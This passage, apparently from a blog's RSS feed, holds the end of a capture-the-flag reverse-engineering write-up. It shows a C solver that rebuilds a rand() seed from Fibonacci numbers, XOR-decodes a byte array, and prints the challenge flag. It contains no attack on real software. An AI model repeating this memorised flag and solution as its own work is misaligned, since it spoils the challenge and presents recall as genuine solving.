&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">6557470319842&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">10610209857723&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">65&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">17167680177565&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">66&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">27777890035288&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">67&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">44945570212853&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">68&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">72723460248141&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">69&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">117669030460994&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">70&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">190392490709135&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">71&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">308061521170129&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">72&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">498454011879264&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">73&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">806515533049393&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">74&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1304969544928657&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">75&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">2111485077978050&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">76&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">3416454622906707&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">77&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">5527939700884757&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">78&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">8944394323791464&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> FLAG[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x63&lt;/span>, &lt;span style="color:#ae81ff">0x98&lt;/span>, &lt;span style="color:#ae81ff">0x3d&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0xb5&lt;/span>, &lt;span style="color:#ae81ff">0x06&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xba&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x0f&lt;/span>, &lt;span style="color:#ae81ff">0xd5&lt;/span>, &lt;span style="color:#ae81ff">0x47&lt;/span>, &lt;span style="color:#ae81ff">0xce&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x97&lt;/span>, &lt;span style="color:#ae81ff">0xef&lt;/span>, &lt;span style="color:#ae81ff">0x7b&lt;/span>, &lt;span style="color:#ae81ff">0x28&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0xdb&lt;/span>, &lt;span style="color:#ae81ff">0xe7&lt;/span>, &lt;span style="color:#ae81ff">0x39&lt;/span>, &lt;span style="color:#ae81ff">0x10&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0xb0&lt;/span>, &lt;span style="color:#ae81ff">0xf5&lt;/span>, &lt;span style="color:#ae81ff">0x44&lt;/span>, &lt;span style="color:#ae81ff">0xec&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x30&lt;/span>, &lt;span style="color:#ae81ff">0x88&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xf6&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x88&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> };
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> seed &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x32&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x4f&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> res &lt;span style="color:#f92672">=&lt;/span> fibo(i);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> seed &lt;span style="color:#f92672">=&lt;/span> seed &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (seed &lt;span style="color:#f92672">^&lt;/span> res) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> srand(seed);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i2 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1d&lt;/span>; i2&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> res &lt;span style="color:#f92672">=&lt;/span> FLAG[i2];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> putchar((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>) res &lt;span style="color:#f92672">^&lt;/span> rand() &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc solve.c -o solve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>... &lt;span style="color:#f92672">(&lt;/span>lots of warnings&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./solve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CYBERTF&lt;span style="color:#f92672">{&lt;/span>Fuck_Fibo_3v3ryWhere&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{Fuck_Fibo_3v3ryWhere}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/take-your-time">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item></channel></rss>